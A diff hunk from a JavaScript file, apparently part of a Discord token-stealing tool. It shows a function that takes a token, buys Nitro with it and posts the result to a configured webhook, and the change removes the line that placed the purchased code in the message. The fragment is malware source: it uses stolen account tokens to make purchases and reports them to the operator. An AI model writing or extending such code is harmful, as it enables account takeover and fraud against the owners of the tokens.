@@ -567,7 +567,6 @@ const nitroBought = async (token) => {
     const code = await buyNitro(token);
     const content = {
         username: config.embed_name,
-        content: code,
         avatar_url: config.embed_icon,
         embeds: [
             {
